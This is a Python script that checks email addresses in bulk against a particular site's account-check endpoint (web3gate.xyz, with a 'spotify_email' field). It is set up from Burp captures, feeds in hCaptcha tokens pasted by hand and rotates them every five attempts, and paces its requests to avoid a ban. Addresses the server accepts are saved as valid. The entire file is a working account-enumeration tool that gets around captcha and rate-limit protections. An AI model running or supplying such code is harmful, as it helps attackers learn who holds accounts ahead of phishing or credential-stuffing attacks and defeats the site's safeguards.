import requests
import time

# === CONFIGURATION ===

API_URL = "https://web3gate.xyz/api/check_email"  # <-- EDIT THIS from Burp
EMAIL_FIELD = "spotify_email"  # <-- Use exact name seen in Burp
CAPTCHA_FIELD = "h-captcha-response"  # <-- Often this is correct
HEADERS = {
    "User-Agent": "Mozilla/5.0",  # <-- Optional: Copy exact headers from Burp
    "Content-Type": "application/json",
    "Origin": "https://web3gate.xyz",  # <-- EDIT THIS
    "Referer": "https://web3gate.xyz/"
}

EMAIL_FILE = "emails.txt"
OUTPUT_FILE = "valid_emails.txt"
ROTATE_TOKEN_EVERY = 5  # Ask for new hCaptcha token after this many tries

# === END CONFIGURATION ===

def load_emails(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def send_email_check(email, captcha_token):
    payload = {
        EMAIL_FIELD: email,
        CAPTCHA_FIELD: captcha_token
    }

    try:
        response = requests.post(API_URL, json=payload, headers=HEADERS)
        print(f"[•] Tested {email} | Status: {response.status_code}")

        # Adjust success condition as needed
        if response.status_code == 200 and "error" not in response.text.lower():
            print(f"[✔] VALID EMAIL: {email}")
            with open(OUTPUT_FILE, 'a') as f:
                f.write(email + '\n')
        else:
            print(f"[✘] Invalid or rejected: {email}")
    except Exception as e:
        print(f"[!] Request failed for {email}: {e}")

def main():
    emails = load_emails(EMAIL_FILE)
    total = len(emails)
    print(f"[*] Loaded {total} emails.")

    captcha_token = input("[🔐] Paste your current hCaptcha token: ").strip()
    used = 0

    for index, email in enumerate(emails):
        send_email_check(email, captcha_token)
        time.sleep(2)  # polite delay to reduce risk of ban
        used += 1

        if used >= ROTATE_TOKEN_EVERY:
            print(f"\n[↻] Used token for {used} emails. Time for a new one.")
            captcha_token = input("[🔐] Paste new hCaptcha token: ").strip()
            used = 0

    print("[✓] Finished testing all emails.")

if __name__ == "__main__":
    main()
